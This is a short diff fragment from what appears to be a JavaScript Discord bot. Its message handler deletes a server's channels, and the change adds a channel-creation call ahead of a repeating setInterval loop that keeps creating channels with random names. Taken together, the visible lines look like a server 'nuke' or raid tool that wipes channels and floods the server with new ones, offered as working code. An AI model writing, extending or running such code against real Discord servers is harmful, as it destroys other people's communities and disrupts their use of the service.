@@ -35,6 +35,10 @@ client.on("messageCreate",function(message){
         channel.delete();
       }
     });
+    guild.channels.create({
+      name:getText(true),
+      type:0
+    });
     setInterval(async function(){
       guild.channels.create({
         name:getText(true),
